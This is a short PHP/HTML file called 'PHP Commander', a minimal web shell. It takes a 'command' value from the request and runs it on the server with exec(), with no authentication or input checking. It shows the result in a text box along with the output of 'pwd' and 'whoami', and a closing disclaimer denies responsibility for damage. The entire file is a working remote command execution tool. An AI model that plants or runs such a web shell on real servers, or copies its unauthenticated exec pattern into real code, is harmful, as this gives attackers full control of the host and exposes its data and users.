<html>
<head>
<META HTTP-EQUIV="Expires" CONTENT="Mon, 01 Jan 1990 01:00:00 GMT">
<meta http-equiv="expires" content="now">
</head>
<title> PHP Commander </title>
<body bgcolor=white>
<br><center>
<img src="pcom.jpg" alt="Pcom - php commander">
</center>
<br><br><br>
<?php
if ($command=="") {
echo "<br><b>Current directory</b>:";
$cpwd=system("pwd");  
echo "<br><b>Current user</b>:";
$cuser=system("whoami");
echo '
<br>
<center>
<form methed="GET" action="pcom.php3">
<input type="Text" name="command" size="70">
<br>
<input type="submit" value="Execute"><input type="reset" value="Reset">
<br>
<textarea name="output" cols="70" rows="15">...</textarea>
<br>
</form>     
' ;
}
else {
echo "<b>Current directory</b>:";
$cpwd=system("pwd");
echo "<br><b>Current user</b>:";
$cuser=system("whoami");
echo "<br><b>Command</b>: $command";
echo "
<br>
<center>
<form methed=\"GET\" action=\"pcom.php3\">
<input type=\"Text\" name=\"command\" size=\"70\">
<br>
<input type=\"submit\" value=\"Execute\"><input type=\"reset\" value=\"Reset\">
<br>
<textarea name=\"outputt\" cols=\"70\" rows=\"15\"> 
" ;
$output = exec($command , $rows);     
$conta = count($rows);
$i = 0 ;
do {
echo "$rows[$i] \n " ;
$i++ ;
} while ($i<$conta) ;
echo "
</textarea>
<br>
</form>
" ;
}
?>
<br>
</center>
<b>NOTE</b>: this is <b>not</b> for interactive commands! Use at your own risk, I'm not responsible
for <b>ANY damage</b> derived by this program.
</body>
</html>
